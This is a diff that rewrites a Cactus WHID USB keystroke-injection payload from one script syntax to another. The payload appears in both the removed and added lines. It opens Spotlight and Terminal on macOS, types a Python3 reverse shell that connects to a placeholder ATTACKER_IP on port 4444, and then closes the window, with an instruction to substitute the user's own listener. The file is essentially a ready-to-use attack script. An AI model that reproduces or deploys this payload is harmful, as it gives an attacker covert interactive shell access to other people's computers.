@@ -1,16 +1,12 @@
-REM === Cactus WHID Payload: macOS Python Reverse Shell ===
-REM Target: macOS
-REM Category: Reverse Shell & Access
-REM Description: Opens Spotlight > Terminal, runs Python3 reverse shell
-REM Replace: ATTACKER_IP and port 4444 with your listener
-DELAY 1000
-GUI SPACE
-DELAY 500
-STRING terminal
-ENTER
-DELAY 1000
-STRING python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])' &
-ENTER
-DELAY 200
-STRING exit
-ENTER
+Rem: Cactus WHID Payload - macOS Python Reverse Shell
+Rem: Target - macOS
+Rem: Opens Spotlight then Terminal, runs Python3 reverse shell
+Rem: Replace ATTACKER_IP and port 4444 with your listener
+CustomDelay:1000
+Press:131+32
+CustomDelay:500
+PrintLine:terminal
+CustomDelay:1000
+PrintLine:python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])' &
+CustomDelay:200
+PrintLine:exit
